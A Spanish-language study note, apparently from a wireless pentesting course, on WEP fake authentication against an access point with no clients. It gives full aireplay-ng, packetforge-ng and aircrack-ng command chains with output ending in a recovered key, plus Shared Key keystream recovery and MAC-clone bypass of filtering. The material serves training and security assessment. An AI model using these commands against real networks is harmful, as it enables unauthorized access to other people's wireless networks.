---
tags:
  - Wi-Fi/WEP
  - Pentesting/Explotacion
Descripción: "Autenticarse falsamente contra el AP para poder inyectar sin ningún cliente asociado, y encadenar fragmentación o ChopChop desde cero"
Fecha de actualización: 2026-08-01
Nota previa: "[[08 - Café Latte y ataques al cliente]]"
Nota siguiente: "[[10 - Cracking - PTW, FMS y KoreK]]"
Area: "[[WEP.base|WEP]]"
---
---

Todos los ataques de inyección necesitan una **MAC asociada** que suplantar: sin ella, el AP descarta las tramas. <mark style="background: #ADCCFFA6;">Cuando no hay ningún cliente, hay que crear esa asociación mediante [*fake authentication*](https://www.aircrack-ng.org/doku.php?id=fake_authentication)</mark> — y WEP lo permite porque su autenticación no verifica nada útil.

# Fake authentication

```shell-session
$ sudo aireplay-ng -1 1000 -o 1 -q 5 \
    -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Sending Authentication Request
Authentication successful
Sending Association Request
Association successful :-)
```

| Opción | Función |
| ------ | ------- |
| `-1 <s>` | Modo fake auth; reasociarse cada `<s>` segundos |
| `-o 1` | Enviar un solo conjunto de paquetes por vez |
| `-q 5` | *Keep-alive* cada 5 segundos para no ser expulsado |
| `-e` | ESSID |
| `-a` | BSSID del AP |
| `-h` | **La MAC propia** de la interfaz |

<mark style="background: #FFB8EBA6;">Aquí `-h` es la MAC de la propia tarjeta, no la de un cliente ajeno</mark>: el objetivo es que el AP acepte a la interfaz atacante como estación legítima. Se confirma viendo la MAC propia en la lista de clientes de `airodump-ng`:

```shell-session
 BSSID              STATION            PWR  Frames  Probes
 60:38:E0:71:E9:DC  00:c0:ca:98:3e:e0  -29   13847  Virt-Corp
```

# Por qué funciona

Depende de qué modo de autenticación use el AP, y la ironía es que el modo "seguro" es el que más regala:

**Open System** — el AP acepta la asociación sin comprobar nada. Sin la clave no se puede cifrar tráfico útil, pero **sí se puede inyectar**, que es todo lo que hace falta para ChopChop y fragmentación.

**Shared Key** — el AP envía un desafío en claro y espera la respuesta cifrada. Un atacante que no tenga la clave no puede responder… salvo que haya capturado antes un intercambio legítimo:

```text
KS = desafío_claro ⊕ desafío_cifrado
```

<mark style="background: #FF5582A6;">Ese XOR entrega 128 bytes de keystream válidos para el IV de aquel intercambio</mark>, suficientes para responder al desafío y autenticarse. `aireplay-ng` lo automatiza con `-y`:

```shell-session
$ sudo aireplay-ng -1 0 -e HTB-Wireless -a 60:38:E0:71:E9:DC \
    -h 00:c0:ca:98:3e:e0 -y sharedkey.xor wlan0mon
```

El keystream se obtiene capturando cualquier autenticación Shared Key: `aireplay-ng` la guarda automáticamente en un `.xor` al detectarla. Ver [[00 - WEP, qué fue y por qué murió]].

# La cadena completa

Con la asociación en pie, se encadena el resto. Cuatro terminales:

```shell-session
# 1 · Captura
$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC -w WEP wlan0mon

# 2 · Mantener la asociación viva
$ sudo aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless \
    -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

# 3 · Conseguir keystream: fragmentación primero, ChopChop si falla
$ sudo aireplay-ng -5 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
$ sudo aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

# 4 · Forjar el ARP y reinyectarlo
$ packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 \
    -k 255.255.255.255 -l 255.255.255.255 \
    -y replay_dec-1229-160018.xor -w forgedarp.cap
$ sudo aireplay-ng -2 -r forgedarp.cap wlan0mon
```

```shell-session
$ sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap
[00:00:00] Tested 2 keys (got 26962 IVs)
KEY FOUND! [ 26:27:F6:85:97 ]
Decrypted correctly: 100%
```

<mark style="background: #8000E1A6;">Cuando no se conocen las IPs de la red, `255.255.255.255` en `-k` y `-l` funciona</mark>: el paquete se trata como broadcast, que es lo que garantiza que el AP lo retransmita.

# El cuello de botella

> [!warning]+ El fake auth es la parte frágil de la cadena
> El propio módulo lo señala: <mark style="background: #FFB86CA6;">funciona sobre todo con routers antiguos, porque los modernos no generan peticiones broadcast ante un cliente que se autentica falsamente</mark>. Aunque la asociación tenga éxito, si el AP no emite tráfico no hay paquete que capturar para arrancar ChopChop o fragmentación.
>
> Cuando eso ocurre, y el AP realmente no tiene clientes ni tráfico, las opciones son:
> - **Esperar.** Un AP WEP con cero tráfico durante horas es raro salvo en equipamiento industrial en reposo.
> - **Provocar tráfico** desde el lado cableado, si hay acceso a la red por otra vía.
> - **Cambiar de objetivo**: si aparece cualquier cliente, [[08 - Café Latte y ataques al cliente]] lo resuelve desde el otro extremo.

# Qué mirar cuando falla

| Síntoma | Causa habitual |
| ------- | -------------- |
| `Authentication failed` | El AP usa Shared Key y falta el `.xor`, o hay filtrado MAC |
| Autenticación OK pero se pierde | Falta `-q` para el keep-alive |
| Asociado pero sin capturar paquetes | El AP no genera tráfico. Es la limitación de arriba |
| `Got a deauth/disassoc packet` | El AP expulsa activamente. Bajar el ritmo o cambiar de MAC |

Si hay **filtrado MAC**, la asociación falla siempre con la MAC de fábrica. La vía es la de [[08 - Bypass de filtrado MAC]]: leer una MAC autorizada de una captura previa y clonarla.

# Perspectiva

Este es el escenario más difícil de WEP, y aun así se resuelve. <mark style="background: #FF5582A6;">Un AP WEP **sin ningún cliente y sin tráfico alguno** es la única configuración que resiste, y sólo porque no hay nada que capturar</mark> — no porque el cifrado aguante.

En cuanto un dispositivo se conecta —un lector de códigos de barras, un PLC, un portátil de mantenimiento—, la clave cae en minutos. Eso es lo que hay que trasladar al informe cuando el cliente argumente que "esa red apenas se usa": la exposición no depende del volumen de uso sino de que exista.

Cómo se convierte el material acumulado en la clave es [[10 - Cracking - PTW, FMS y KoreK]].
